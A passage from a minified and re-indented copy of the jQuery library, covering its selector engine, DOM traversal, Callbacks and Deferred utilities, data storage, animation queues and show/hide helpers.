                                                        if (e = d[cX] || (d[cX] = {}), f = e[d.uniqueID] || (e[d.uniqueID] = {}), n && n === d.nodeName.toLowerCase()) {
                                                            d = d[o] || d
                                                        } else {
                                                            if ((g = f[m]) && g[0] === cV && g[1] === k) {
                                                                return a[2] = g[2]
                                                            }
                                                            if (f[m] = a, a[2] = j(d, q, h)) {
                                                                return !0
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                            return !1
                                        }
                                    }

                                    function dm(b) {
                                        return b.length > 1 ? function(a, h, g) {
                                            var f = b.length;
                                            while (f--) {
                                                if (!b[f](a, h, g)) {
                                                    return !1
                                                }
                                            }
                                            return !0
                                        } : b[0]
                                    }

                                    function cR(g, f, j) {
                                        for (var i = 0, h = f.length; i < h; i++) {
                                            dV(g, f[i], j)
                                        }
                                        return j
                                    }

                                    function cN(t, s, r, q, p) {
                                        for (var o, n = [], m = 0, l = t.length, k = null != s; m < l; m++) {
                                            (o = t[m]) && (r && !r(o, q, p) || (n.push(o), k && s.push(m)))
                                        }
                                        return n
                                    }

                                    function ab(h, g, l, k, j, i) {
                                        return k && !k[cX] && (k = ab(k)), j && !j[cX] && (j = ab(j, i)), dc(function(z, y, x, w) {
                                            var v, u, t, s = [],
                                                e = [],
                                                d = y.length,
                                                c = z || cR(g || "*", x.nodeType ? [x] : x, []),
                                                b = !h || !z && g ? c : cN(c, s, h, x, w),
                                                a = l ? j || (z ? h : d || k) ? [] : y : b;
                                            if (l && l(b, a, x, w), k) {
                                                v = cN(a, e), k(v, [], x, w), u = v.length;
                                                while (u--) {
                                                    (t = v[u]) && (a[e[u]] = !(b[e[u]] = t))
                                                }
                                            }
                                            if (z) {
                                                if (j || h) {
                                                    if (j) {
                                                        v = [], u = a.length;
                                                        while (u--) {
                                                            (t = a[u]) && v.push(b[u] = t)
                                                        }
                                                        j(null, a = [], v, w)
                                                    }
                                                    u = a.length;
                                                    while (u--) {
                                                        (t = a[u]) && (v = j ? dI(z, t) : s[u]) > -1 && (z[v] = !(y[v] = t))
                                                    }
                                                }
                                            } else {
                                                a = cN(a === y ? a.splice(d, a.length) : a), j ? j(null, y, a, w) : dK.apply(y, a)
                                            }
                                        })
                                    }

                                    function dZ(v) {
                                        for (var u, t, s, r = v.length, q = dh.relative[v[0].type], p = q || dh.relative[" "], o = q ? 1 : 0, n = dS(function(b) {
                                                return b === u
                                            }, p, !0), j = dS(function(b) {
                                                return dI(u, b) > -1
                                            }, p, !0), d = [function(b, h, g) {
                                                var f = !q && (g || h !== c9) || ((u = h).nodeType ? n(b, h, g) : j(b, h, g));
                                                return u = null, f
                                            }]; o < r; o++) {
                                            if (t = dh.relative[v[o].type]) {
                                                d = [dS(dm(d), t)]
                                            } else {
                                                if (t = dh.filter[v[o].type].apply(null, v[o].matches), t[cX]) {
                                                    for (s = ++o; s < r; s++) {
                                                        if (dh.relative[v[s].type]) {
                                                            break
                                                        }
                                                    }
                                                    return ab(o > 1 && dm(d), o > 1 && dY(v.slice(0, o - 1).concat({
                                                        value: " " === v[o - 2].type ? "*" : ""
                                                    })).replace(dz, "$1"), t, o < s && dZ(v.slice(o, s)), s < r && dZ(v = v.slice(s)), s < r && dY(v))
                                                }
                                                d.push(t)
                                            }
                                        }
                                        return dm(d)
                                    }

                                    function dT(g, d) {
                                        var j = d.length > 0,
                                            i = g.length > 0,
                                            h = function(A, w, p, n, m) {
                                                var e, c, b, a = 0,
                                                    H = "0",
                                                    G = A && [],
                                                    F = [],
                                                    E = c9,
                                                    D = A || i && dh.find.TAG("*", m),
                                                    C = cV += null == E ? 1 : Math.random() || 0.1,
                                                    B = D.length;
                                                for (m && (c9 = w === c4 || w || m); H !== B && null != (e = D[H]); H++) {
                                                    if (i && e) {
                                                        c = 0, w || e.ownerDocument === c4 || (c6(e), p = !c2);
                                                        while (b = g[c++]) {
                                                            if (b(e, w || c4, p)) {
                                                                n.push(e);
                                                                break
                                                            }
                                                        }
                                                        m && (cV = C)
                                                    }
                                                    j && ((e = !b && e) && a--, A && G.push(e))
                                                }
                                                if (a += H, j && H !== a) {
                                                    c = 0;
                                                    while (b = d[c++]) {
                                                        b(G, F, w, p)
                                                    }
                                                    if (A) {
                                                        if (a > 0) {
                                                            while (H--) {
                                                                G[H] || F[H] || (F[H] = dM.call(n))
                                                            }
                                                        }
                                                        F = cN(F)
                                                    }
                                                    dK.apply(n, F), m && !A && F.length > 0 && a + d.length > 1 && dV.uniqueSort(n)
                                                }
                                                return m && (cV = C, c9 = E), G
                                            };
                                        return j ? dc(h) : h
                                    }
                                    return dd = dV.compile = function(h, g) {
                                        var l, k = [],
                                            j = [],
                                            i = dR[h + " "];
                                        if (!i) {
                                            g || (g = de(h)), l = g.length;
                                            while (l--) {
                                                i = dZ(g[l]), i[cX] ? k.push(i) : j.push(i)
                                            }
                                            i = dR(h, dT(j, k)), i.selector = h
                                        }
                                        return i
                                    }, db = dV.select = function(v, u, t, s) {
                                        var r, q, p, o, h, g = "function" == typeof v && v,
                                            d = !s && de(v = g.selector || v);
                                        if (t = t || [], 1 === d.length) {
                                            if (q = d[0] = d[0].slice(0), q.length > 2 && "ID" === (p = q[0]).type && 9 === u.nodeType && c2 && dh.relative[q[1].type]) {
                                                if (u = (dh.find.ID(p.matches[0].replace(dn, dU), u) || [])[0], !u) {
                                                    return t
                                                }
                                                g && (u = u.parentNode), v = v.slice(q.shift().value.length)
                                            }
                                            r = dt.needsContext.test(v) ? 0 : q.length;
                                            while (r--) {
                                                if (p = q[r], dh.relative[o = p.type]) {
                                                    break
                                                }
                                                if ((h = dh.find[o]) && (s = h(p.matches[0].replace(dn, dU), dX.test(q[0].type) && cM(u.parentNode) || u))) {
                                                    if (q.splice(r, 1), v = s.length && dY(q), !v) {
                                                        return dK.apply(t, s), t
                                                    }
                                                    break
                                                }
                                            }
                                        }
                                        return (g || dd(v, d))(s, u, !c2, t, !u || dX.test(v) && cM(u.parentNode) || u), t
                                    }, dj.sortStable = cX.split("").sort(dQ).join("") === cX, dj.detectDuplicates = !!c7, c6(), dj.sortDetached = cP(function(b) {
                                        return 1 & b.compareDocumentPosition(c4.createElement("fieldset"))
                                    }), cP(function(b) {
                                        return b.innerHTML = "<a href='#'></a>", "#" === b.firstChild.getAttribute("href")
                                    }) || cb("type|href|height|width", function(e, d, f) {
                                        if (!f) {
                                            return e.getAttribute(d, "type" === d.toLowerCase() ? 1 : 2)
                                        }
                                    }), dj.attributes && cP(function(b) {
                                        return b.innerHTML = "<input/>", b.firstChild.setAttribute("value", ""), "" === b.firstChild.getAttribute("value")
                                    }) || cb("value", function(e, d, f) {
                                        if (!f && "input" === e.nodeName.toLowerCase()) {
                                            return e.defaultValue
                                        }
                                    }), cP(function(b) {
                                        return null == b.getAttribute("disabled")
                                    }) || cb(dG, function(f, e, h) {
                                        var g;
                                        if (!h) {
                                            return f[e] === !0 ? e.toLowerCase() : (g = f.getAttributeNode(e)) && g.specified ? g.value : null
                                        }
                                    }), dV
                                }(bP);
                                bv.find = bp, bv.expr = bp.selectors, bv.expr[":"] = bv.expr.pseudos, bv.uniqueSort = bv.unique = bp.uniqueSort, bv.text = bp.getText, bv.isXMLDoc = bp.isXML, bv.contains = bp.contains, bv.escapeSelector = bp.escape;
                                var bo = function(g, f, j) {
                                        var i = [],
                                            h = void 0 !== j;
                                        while ((g = g[f]) && 9 !== g.nodeType) {
                                            if (1 === g.nodeType) {
                                                if (h && bv(g).is(j)) {
                                                    break
                                                }
                                                i.push(g)
                                            }
                                        }
                                        return i
                                    },
                                    bm = function(e, d) {
                                        for (var f = []; e; e = e.nextSibling) {
                                            1 === e.nodeType && e !== d && f.push(e)
                                        }
                                        return f
                                    },
                                    cp = bv.expr.match.needsContext,
                                    co = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i,
                                    cn = /^.[^:#\[\.,]*$/;

                                function cm(e, d, f) {
                                    return bv.isFunction(d) ? bv.grep(e, function(b, c) {
                                        return !!d.call(b, c, b) !== f
                                    }) : d.nodeType ? bv.grep(e, function(b) {
                                        return b === d !== f
                                    }) : "string" != typeof d ? bv.grep(e, function(b) {
                                        return bF.call(d, b) > -1 !== f
                                    }) : cn.test(d) ? bv.filter(d, e, f) : (d = bv.filter(d, e), bv.grep(e, function(b) {
                                        return bF.call(d, b) > -1 !== f && 1 === b.nodeType
                                    }))
                                }
                                bv.filter = function(f, e, h) {
                                    var g = e[0];
                                    return h && (f = ":not(" + f + ")"), 1 === e.length && 1 === g.nodeType ? bv.find.matchesSelector(g, f) ? [g] : [] : bv.find.matches(f, bv.grep(e, function(b) {
                                        return 1 === b.nodeType
                                    }))
                                }, bv.fn.extend({
                                    find: function(g) {
                                        var f, j, i = this.length,
                                            h = this;
                                        if ("string" != typeof g) {
                                            return this.pushStack(bv(g).filter(function() {
                                                for (f = 0; f < i; f++) {
                                                    if (bv.contains(h[f], this)) {
                                                        return !0
                                                    }
                                                }
                                            }))
                                        }
                                        for (j = this.pushStack([]), f = 0; f < i; f++) {
                                            bv.find(g, h[f], j)
                                        }
                                        return i > 1 ? bv.uniqueSort(j) : j
                                    },
                                    filter: function(b) {
                                        return this.pushStack(cm(this, b || [], !1))
                                    },
                                    not: function(b) {
                                        return this.pushStack(cm(this, b || [], !0))
                                    },
                                    is: function(b) {
                                        return !!cm(this, "string" == typeof b && cp.test(b) ? bv(b) : b || [], !1).length
                                    }
                                });
                                var cl, ck = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/,
                                    ci = bv.fn.init = function(g, d, j) {
                                        var i, h;
                                        if (!g) {
                                            return this
                                        }
                                        if (j = j || cl, "string" == typeof g) {
                                            if (i = "<" === g[0] && ">" === g[g.length - 1] && g.length >= 3 ? [null, g, null] : ck.exec(g), !i || !i[1] && d) {
                                                return !d || d.jquery ? (d || j).find(g) : this.constructor(d).find(g)
                                            }
                                            if (i[1]) {
                                                if (d = d instanceof bv ? d[0] : d, bv.merge(this, bv.parseHTML(i[1], d && d.nodeType ? d.ownerDocument || d : bM, !0)), co.test(i[1]) && bv.isPlainObject(d)) {
                                                    for (i in d) {
                                                        bv.isFunction(this[i]) ? this[i](d[i]) : this.attr(i, d[i])
                                                    }
                                                }
                                                return this
                                            }
                                            return h = bM.getElementById(i[2]), h && (this[0] = h, this.length = 1), this
                                        }
                                        return g.nodeType ? (this[0] = g, this.length = 1, this) : bv.isFunction(g) ? void 0 !== j.ready ? j.ready(g) : g(bv) : bv.makeArray(g, this)
                                    };
                                ci.prototype = bv.fn, cl = bv(bM);
                                var cg = /^(?:parents|prev(?:Until|All))/,
                                    cf = {
                                        children: !0,
                                        contents: !0,
                                        next: !0,
                                        prev: !0
                                    };
                                bv.fn.extend({
                                    has: function(e) {
                                        var d = bv(e, this),
                                            f = d.length;
                                        return this.filter(function() {
                                            for (var b = 0; b < f; b++) {
                                                if (bv.contains(this, d[b])) {
                                                    return !0
                                                }
                                            }
                                        })
                                    },
                                    closest: function(i, h) {
                                        var n, m = 0,
                                            l = this.length,
                                            k = [],
                                            j = "string" != typeof i && bv(i);
                                        if (!cp.test(i)) {
                                            for (; m < l; m++) {
                                                for (n = this[m]; n && n !== h; n = n.parentNode) {
                                                    if (n.nodeType < 11 && (j ? j.index(n) > -1 : 1 === n.nodeType && bv.find.matchesSelector(n, i))) {
                                                        k.push(n);
                                                        break
                                                    }
                                                }
                                            }
                                        }
                                        return this.pushStack(k.length > 1 ? bv.uniqueSort(k) : k)
                                    },
                                    index: function(b) {
                                        return b ? "string" == typeof b ? bF.call(bv(b), this[0]) : bF.call(this, b.jquery ? b[0] : b) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
                                    },
                                    add: function(d, c) {
                                        return this.pushStack(bv.uniqueSort(bv.merge(this.get(), bv(d, c))))
                                    },
                                    addBack: function(b) {
                                        return this.add(null == b ? this.prevObject : this.prevObject.filter(b))
                                    }
                                });

                                function ce(d, c) {
                                    while ((d = d[c]) && 1 !== d.nodeType) {}
                                    return d
                                }
                                bv.each({
                                    parent: function(d) {
                                        var c = d.parentNode;
                                        return c && 11 !== c.nodeType ? c : null
                                    },
                                    parents: function(b) {
                                        return bo(b, "parentNode")
                                    },
                                    parentsUntil: function(e, d, f) {
                                        return bo(e, "parentNode", f)
                                    },
                                    next: function(b) {
                                        return ce(b, "nextSibling")
                                    },
                                    prev: function(b) {
                                        return ce(b, "previousSibling")
                                    },
                                    nextAll: function(b) {
                                        return bo(b, "nextSibling")
                                    },
                                    prevAll: function(b) {
                                        return bo(b, "previousSibling")
                                    },
                                    nextUntil: function(e, d, f) {
                                        return bo(e, "nextSibling", f)
                                    },
                                    prevUntil: function(e, d, f) {
                                        return bo(e, "previousSibling", f)
                                    },
                                    siblings: function(b) {
                                        return bm((b.parentNode || {}).firstChild, b)
                                    },
                                    children: function(b) {
                                        return bm(b.firstChild)
                                    },
                                    contents: function(b) {
                                        return b.contentDocument || bv.merge([], b.childNodes)
                                    }
                                }, function(d, c) {
                                    bv.fn[d] = function(f, b) {
                                        var a = bv.map(this, c, f);
                                        return "Until" !== d.slice(-5) && (b = f), b && "string" == typeof b && (a = bv.filter(b, a)), this.length > 1 && (cf[d] || bv.uniqueSort(a), cg.test(d) && a.reverse()), this.pushStack(a)
                                    }
                                });
                                var cd = /[^\x20\t\r\n\f]+/g;

                                function cc(d) {
                                    var c = {};
                                    return bv.each(d.match(cd) || [], function(b, e) {
                                        c[e] = !0
                                    }), c
                                }
                                bv.Callbacks = function(t) {
                                    t = "string" == typeof t ? cc(t) : bv.extend({}, t);
                                    var s, r, q, p, o = [],
                                        n = [],
                                        m = -1,
                                        l = function() {
                                            for (p = t.once, q = s = !0; n.length; m = -1) {
                                                r = n.shift();
                                                while (++m < o.length) {
                                                    o[m].apply(r[0], r[1]) === !1 && t.stopOnFalse && (m = o.length, r = !1)
                                                }
                                            }
                                            t.memory || (r = !1), s = !1, p && (o = r ? [] : "")
                                        },
                                        k = {
                                            add: function() {
                                                return o && (r && !s && (m = o.length - 1, n.push(r)), function a(c) {
                                                    bv.each(c, function(d, e) {
                                                        bv.isFunction(e) ? t.unique && k.has(e) || o.push(e) : e && e.length && "string" !== bv.type(e) && a(e)
                                                    })
                                                }(arguments), r && !s && l()), this
                                            },
                                            remove: function() {
                                                return bv.each(arguments, function(e, d) {
                                                    var f;
                                                    while ((f = bv.inArray(d, o, f)) > -1) {
                                                        o.splice(f, 1), f <= m && m--
                                                    }
                                                }), this
                                            },
                                            has: function(b) {
                                                return b ? bv.inArray(b, o) > -1 : o.length > 0
                                            },
                                            empty: function() {
                                                return o && (o = []), this
                                            },
                                            disable: function() {
                                                return p = n = [], o = r = "", this
                                            },
                                            disabled: function() {
                                                return !o
                                            },
                                            lock: function() {
                                                return p = n = [], r || s || (o = r = ""), this
                                            },
                                            locked: function() {
                                                return !!p
                                            },
                                            fireWith: function(b, d) {
                                                return p || (d = d || [], d = [b, d.slice ? d.slice() : d], n.push(d), s || l()), this
                                            },
                                            fire: function() {
                                                return k.fireWith(this, arguments), this
                                            },
                                            fired: function() {
                                                return !!q
                                            }
                                        };
                                    return k
                                };

                                function b9(b) {
                                    return b
                                }

                                function b8(b) {
                                    throw b
                                }

                                function b7(f, e, h) {
                                    var g;
                                    try {
                                        f && bv.isFunction(g = f.promise) ? g.call(f).done(e).fail(h) : f && bv.isFunction(g = f.then) ? g.call(f, e, h) : e.call(void 0, f)
                                    } catch (f) {
                                        h.call(void 0, f)
                                    }
                                }
                                bv.extend({
                                    Deferred: function(a) {
                                        var j = [
                                                ["notify", "progress", bv.Callbacks("memory"), bv.Callbacks("memory"), 2],
                                                ["resolve", "done", bv.Callbacks("once memory"), bv.Callbacks("once memory"), 0, "resolved"],
                                                ["reject", "fail", bv.Callbacks("once memory"), bv.Callbacks("once memory"), 1, "rejected"]
                                            ],
                                            i = "pending",
                                            h = {
                                                state: function() {
                                                    return i
                                                },
                                                always: function() {
                                                    return g.done(arguments).fail(arguments), this
                                                },
                                                "catch": function(b) {
                                                    return h.then(null, b)
                                                },
                                                pipe: function() {
                                                    var b = arguments;
                                                    return bv.Deferred(function(c) {
                                                        bv.each(j, function(l, k) {
                                                            var f = bv.isFunction(b[k[4]]) && b[k[4]];
                                                            g[k[1]](function() {
                                                                var d = f && f.apply(this, arguments);
                                                                d && bv.isFunction(d.promise) ? d.promise().progress(c.notify).done(c.resolve).fail(c.reject) : c[k[0] + "With"](this, f ? [d] : arguments)
                                                            })
                                                        }), b = null
                                                    }).promise()
                                                },
                                                then: function(c, n, m) {
                                                    var l = 0;

                                                    function k(f, q, p, o) {
                                                        return function() {
                                                            var r = this,
                                                                e = arguments,
                                                                d = function() {
                                                                    var s, t;
                                                                    if (!(f < l)) {
                                                                        if (s = p.apply(r, e), s === q.promise()) {
                                                                            throw new TypeError("Thenable self-resolution")
                                                                        }
                                                                        t = s && ("object" == typeof s || "function" == typeof s) && s.then, bv.isFunction(t) ? o ? t.call(s, k(l, q, b9, o), k(l, q, b8, o)) : (l++, t.call(s, k(l, q, b9, o), k(l, q, b8, o), k(l, q, b9, q.notifyWith))) : (p !== b9 && (r = void 0, e = [s]), (o || q.resolveWith)(r, e))
                                                                    }
                                                                },
                                                                b = o ? d : function() {
                                                                    try {
                                                                        d()
                                                                    } catch (s) {
                                                                        bv.Deferred.exceptionHook && bv.Deferred.exceptionHook(s, b.stackTrace), f + 1 >= l && (p !== b8 && (r = void 0, e = [s]), q.rejectWith(r, e))
                                                                    }
                                                                };
                                                            f ? b() : (bv.Deferred.getStackHook && (b.stackTrace = bv.Deferred.getStackHook()), bP.setTimeout(b))
                                                        }
                                                    }
                                                    return bv.Deferred(function(b) {
                                                        j[0][3].add(k(0, b, bv.isFunction(m) ? m : b9, b.notifyWith)), j[1][3].add(k(0, b, bv.isFunction(c) ? c : b9)), j[2][3].add(k(0, b, bv.isFunction(n) ? n : b8))
                                                    }).promise()
                                                },
                                                promise: function(b) {
                                                    return null != b ? bv.extend(b, h) : h
                                                }
                                            },
                                            g = {};
                                        return bv.each(j, function(d, c) {
                                            var f = c[2],
                                                e = c[5];
                                            h[c[1]] = f.add, e && f.add(function() {
                                                i = e
                                            }, j[3 - d][2].disable, j[0][2].lock), f.add(c[3].fire), g[c[0]] = function() {
                                                return g[c[0] + "With"](this === g ? void 0 : this, arguments), this
                                            }, g[c[0] + "With"] = f.fireWith
                                        }), h.promise(g), a && a.call(g, g), g
                                    },
                                    when: function(i) {
                                        var f = arguments.length,
                                            n = f,
                                            m = Array(n),
                                            l = bJ.call(arguments),
                                            k = bv.Deferred(),
                                            j = function(b) {
                                                return function(a) {
                                                    m[b] = this, l[b] = arguments.length > 1 ? bJ.call(arguments) : a, --f || k.resolveWith(m, l)
                                                }
                                            };
                                        if (f <= 1 && (b7(i, k.done(j(n)).resolve, k.reject), "pending" === k.state() || bv.isFunction(l[n] && l[n].then))) {
                                            return k.then()
                                        }
                                        while (n--) {
                                            b7(l[n], j(n), k.reject)
                                        }
                                        return k.promise()
                                    }
                                });
                                var b6 = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;
                                bv.Deferred.exceptionHook = function(a, d) {
                                    bP.console && bP.console.warn && a && b6.test(a.name) && bP.console.warn("jQuery.Deferred exception: " + a.message, a.stack, d)
                                }, bv.readyException = function(a) {
                                    bP.setTimeout(function() {
                                        throw a
                                    })
                                };
                                var b5 = bv.Deferred();
                                bv.fn.ready = function(b) {
                                    return b5.then(b)["catch"](function(c) {
                                        bv.readyException(c)
                                    }), this
                                }, bv.extend({
                                    isReady: !1,
                                    readyWait: 1,
                                    holdReady: function(b) {
                                        b ? bv.readyWait++ : bv.ready(!0)
                                    },
                                    ready: function(b) {
                                        (b === !0 ? --bv.readyWait : bv.isReady) || (bv.isReady = !0, b !== !0 && --bv.readyWait > 0 || b5.resolveWith(bM, [bv]))
                                    }
                                }), bv.ready.then = b5.then;

                                function b3() {
                                    bM.removeEventListener("DOMContentLoaded", b3), bP.removeEventListener("load", b3), bv.ready()
                                }
                                "complete" === bM.readyState || "loading" !== bM.readyState && !bM.documentElement.doScroll ? bP.setTimeout(bv.ready) : (bM.addEventListener("DOMContentLoaded", b3), bP.addEventListener("load", b3));
                                var b2 = function(t, s, r, q, p, o, n) {
                                        var m = 0,
                                            l = t.length,
                                            k = null == r;
                                        if ("object" === bv.type(r)) {
                                            p = !0;
                                            for (m in r) {
                                                b2(t, s, m, r[m], !0, o, n)
                                            }
                                        } else {
                                            if (void 0 !== q && (p = !0, bv.isFunction(q) || (n = !0), k && (n ? (s.call(t, q), s = null) : (k = s, s = function(e, d, f) {
                                                    return k.call(bv(e), f)
                                                })), s)) {
                                                for (; m < l; m++) {
                                                    s(t[m], r, n ? q : q.call(t[m], m, s(t[m], r)))
                                                }
                                            }
                                        }
                                        return p ? t : k ? s.call(t) : l ? s(t[0], r) : o
                                    },
                                    b1 = function(b) {
                                        return 1 === b.nodeType || 9 === b.nodeType || !+b.nodeType
                                    };

                                function b0() {
                                    this.expando = bv.expando + b0.uid++
                                }
                                b0.uid = 1, b0.prototype = {
                                    cache: function(d) {
                                        var c = d[this.expando];
                                        return c || (c = {}, b1(d) && (d.nodeType ? d[this.expando] = c : Object.defineProperty(d, this.expando, {
                                            value: c,
                                            configurable: !0
                                        }))), c
                                    },
                                    set: function(g, f, j) {
                                        var i, h = this.cache(g);
                                        if ("string" == typeof f) {
                                            h[bv.camelCase(f)] = j
                                        } else {
                                            for (i in f) {
                                                h[bv.camelCase(i)] = f[i]
                                            }
                                        }
                                        return h
                                    },
                                    get: function(d, c) {
                                        return void 0 === c ? this.cache(d) : d[this.expando] && d[this.expando][bv.camelCase(c)]
                                    },
                                    access: function(e, d, f) {
                                        return void 0 === d || d && "string" == typeof d && void 0 === f ? this.get(e, d) : (this.set(e, d, f), void 0 !== f ? f : d)
                                    },
                                    remove: function(f, e) {
                                        var h, g = f[this.expando];
                                        if (void 0 !== g) {
                                            if (void 0 !== e) {
                                                bv.isArray(e) ? e = e.map(bv.camelCase) : (e = bv.camelCase(e), e = e in g ? [e] : e.match(cd) || []), h = e.length;
                                                while (h--) {
                                                    delete g[e[h]]
                                                }
                                            }(void 0 === e || bv.isEmptyObject(g)) && (f.nodeType ? f[this.expando] = void 0 : delete f[this.expando])
                                        }
                                    },
                                    hasData: function(d) {
                                        var c = d[this.expando];
                                        return void 0 !== c && !bv.isEmptyObject(c)
                                    }
                                };
                                var bZ = new b0,
                                    bY = new b0,
                                    bX = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
                                    bW = /[A-Z]/g;

                                function bV(b) {
                                    return "true" === b || "false" !== b && ("null" === b ? null : b === +b + "" ? +b : bX.test(b) ? JSON.parse(b) : b)
                                }

                                function cB(g, f, j) {
                                    var i;
                                    if (void 0 === j && 1 === g.nodeType) {
                                        if (i = "data-" + f.replace(bW, "-$&").toLowerCase(), j = g.getAttribute(i), "string" == typeof j) {
                                            try {
                                                j = bV(j)
                                            } catch (h) {}
                                            bY.set(g, f, j)
                                        } else {
                                            j = void 0
                                        }
                                    }
                                    return j
                                }
                                bv.extend({
                                    hasData: function(b) {
                                        return bY.hasData(b) || bZ.hasData(b)
                                    },
                                    data: function(e, d, f) {
                                        return bY.access(e, d, f)
                                    },
                                    removeData: function(d, c) {
                                        bY.remove(d, c)
                                    },
                                    _data: function(e, d, f) {
                                        return bZ.access(e, d, f)
                                    },
                                    _removeData: function(d, c) {
                                        bZ.remove(d, c)
                                    }
                                }), bv.fn.extend({
                                    data: function(i, h) {
                                        var n, m, l, k = this[0],
                                            j = k && k.attributes;
                                        if (void 0 === i) {
                                            if (this.length && (l = bY.get(k), 1 === k.nodeType && !bZ.get(k, "hasDataAttrs"))) {
                                                n = j.length;
                                                while (n--) {
                                                    j[n] && (m = j[n].name, 0 === m.indexOf("data-") && (m = bv.camelCase(m.slice(5)), cB(k, m, l[m])))
                                                }
                                                bZ.set(k, "hasDataAttrs", !0)
                                            }
                                            return l
                                        }
                                        return "object" == typeof i ? this.each(function() {
                                            bY.set(this, i)
                                        }) : b2(this, function(a) {
                                            var d;
                                            if (k && void 0 === a) {
                                                if (d = bY.get(k, i), void 0 !== d) {
                                                    return d
                                                }
                                                if (d = cB(k, i), void 0 !== d) {
                                                    return d
                                                }
                                            } else {
                                                this.each(function() {
                                                    bY.set(this, i, a)
                                                })
                                            }
                                        }, null, h, arguments.length > 1, null, !0)
                                    },
                                    removeData: function(b) {
                                        return this.each(function() {
                                            bY.remove(this, b)
                                        })
                                    }
                                }), bv.extend({
                                    queue: function(f, e, h) {
                                        var g;
                                        if (f) {
                                            return e = (e || "fx") + "queue", g = bZ.get(f, e), h && (!g || bv.isArray(h) ? g = bZ.access(f, e, bv.makeArray(h)) : g.push(h)), g || []
                                        }
                                    },
                                    dequeue: function(i, h) {
                                        h = h || "fx";
                                        var n = bv.queue(i, h),
                                            m = n.length,
                                            l = n.shift(),
                                            k = bv._queueHooks(i, h),
                                            j = function() {
                                                bv.dequeue(i, h)
                                            };
                                        "inprogress" === l && (l = n.shift(), m--), l && ("fx" === h && n.unshift("inprogress"), delete k.stop, l.call(i, j, k)), !m && k && k.empty.fire()
                                    },
                                    _queueHooks: function(e, d) {
                                        var f = d + "queueHooks";
                                        return bZ.get(e, f) || bZ.access(e, f, {
                                            empty: bv.Callbacks("once memory").add(function() {
                                                bZ.remove(e, [d + "queue", f])
                                            })
                                        })
                                    }
                                }), bv.fn.extend({
                                    queue: function(e, d) {
                                        var f = 2;
                                        return "string" != typeof e && (d = e, e = "fx", f--), arguments.length < f ? bv.queue(this[0], e) : void 0 === d ? this : this.each(function() {
                                            var a = bv.queue(this, e, d);
                                            bv._queueHooks(this, e), "fx" === e && "inprogress" !== a[0] && bv.dequeue(this, e)
                                        })
                                    },
                                    dequeue: function(b) {
                                        return this.each(function() {
                                            bv.dequeue(this, b)
                                        })
                                    },
                                    clearQueue: function(b) {
                                        return this.queue(b || "fx", [])
                                    },
                                    promise: function(j, i) {
                                        var p, o = 1,
                                            n = bv.Deferred(),
                                            m = this,
                                            l = this.length,
                                            k = function() {
                                                --o || n.resolveWith(m, [m])
                                            };
                                        "string" != typeof j && (i = j, j = void 0), j = j || "fx";
                                        while (l--) {
                                            p = bZ.get(m[l], j + "queueHooks"), p && p.empty && (o++, p.empty.add(k))
                                        }
                                        return k(), n.promise(i)
                                    }
                                });
                                var bQ = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
                                    cA = new RegExp("^(?:([+-])=|)(" + bQ + ")([a-z%]*)$", "i"),
                                    cj = ["Top", "Right", "Bottom", "Left"],
                                    bK = function(d, c) {
                                        return d = c || d, "none" === d.style.display || "" === d.style.display && bv.contains(d.ownerDocument, d) && "none" === bv.css(d, "display")
                                    },
                                    bi = function(i, h, n, m) {
                                        var l, k, j = {};
                                        for (k in h) {
                                            j[k] = i.style[k], i.style[k] = h[k]
                                        }
                                        l = n.apply(i, m || []);
                                        for (k in h) {
                                            i.style[k] = j[k]
                                        }
                                        return l
                                    };

                                function a9(v, u, t, s) {
                                    var r, q = 1,
                                        p = 20,
                                        o = s ? function() {
                                            return s.cur()
                                        } : function() {
                                            return bv.css(v, u, "")
                                        },
                                        n = o(),
                                        m = t && t[3] || (bv.cssNumber[u] ? "" : "px"),
                                        l = (bv.cssNumber[u] || "px" !== m && +n) && cA.exec(bv.css(v, u));
                                    if (l && l[3] !== m) {
                                        m = m || l[3], t = t || [], l = +n || 1;
                                        do {
                                            q = q || ".5", l /= q, bv.style(v, u, l + m)
                                        } while (q !== (q = o() / n) && 1 !== q && --p)
                                    }
                                    return t && (l = +l || +n || 0, r = t[1] ? l + (t[1] + 1) * t[2] : +t[2], s && (s.unit = m, s.start = l, s.end = r)), r
                                }
                                var a2 = {};

                                function aT(g) {
                                    var f, j = g.ownerDocument,
                                        i = g.nodeName,
                                        h = a2[i];
                                    return h ? h : (f = j.body.appendChild(j.createElement(i)), h = bv.css(f, "display"), f.parentNode.removeChild(f), "none" === h && (h = "block"), a2[i] = h, h)
                                }

                                function aL(i, h) {
                                    for (var n, m, l = [], k = 0, j = i.length; k < j; k++) {
                                        m = i[k], m.style && (n = m.style.display, h ? ("none" === n && (l[k] = bZ.get(m, "display") || null, l[k] || (m.style.display = "")), "" === m.style.display && bK(m) && (l[k] = aT(m))) : "none" !== n && (l[k] = "none", bZ.set(m, "display", n)))
                                    }
                                    for (k = 0; k < j; k++) {
                                        null != l[k] && (i[k].style.display = l[k])
                                    }
                                    return i
                                }
                                bv.fn.extend({
                                    show: function() {
                                        return aL(this, !0)
                                    },
                                    hide: function() {
                                        return aL(this)
                                    },
                                    toggle: function(b) {
                                        return "boolean" == typeof b ? b ? this.show() : this.hide() : this.each(function() {
                                            bK(this) ? bv(this).show() : bv(this).hide()
                                        })
                                    }
                                });
                                var aD = /^(?:checkbox|radio)$/i,
                                    av = /<([a-z][^\/\0>\x20\t\r\n\f]+)/i,
                                    am = /^$|\/(?:java|ecma)script/i,
                                    ad = {
                                        option: [1, "<select multiple='multiple'>", "</select>"],
                                        thead: [1, "<table>", "</table>"],
                                        col: [2, "<table><colgroup>", "</colgroup></table>"],
                                        tr: [2, "<table><tbody>", "</tbody></table>"],
                                        td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
                                        _default: [0, "", ""]
                                    };
                                ad.optgroup = ad.option, ad.tbody = ad.tfoot = ad.colgroup = ad.caption = ad.thead, ad.th = ad.td;

                                function cF(e, d) {
                                    var f;
